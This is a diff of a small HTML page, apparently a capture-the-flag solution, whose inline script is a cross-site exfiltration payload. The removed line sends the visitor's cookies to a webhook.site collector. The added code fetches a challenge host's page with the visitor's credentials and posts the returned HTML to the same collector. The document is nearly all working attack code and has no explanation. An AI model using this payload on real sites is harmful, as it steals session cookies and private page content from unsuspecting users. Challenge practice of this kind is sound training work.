@@ -1,9 +1,15 @@
 <!DOCTYPE html>
 <html>
-<head></head>
 <body>
 <script>
-fetch("https://webhook.site/49f55743-6eb6-4233-8e01-153337546931?c=" + document.cookie)
+fetch("http://challs-acm.xstf.pt:53179/", {credentials: "include"})
+  .then(r => r.text())
+  .then(html => {
+    fetch("https://webhook.site/49f55743-6eb6-4233-8e01-153337546931", {
+      method: "POST",
+      body: html
+    })
+  })
 </script>
 </body>
 </html>
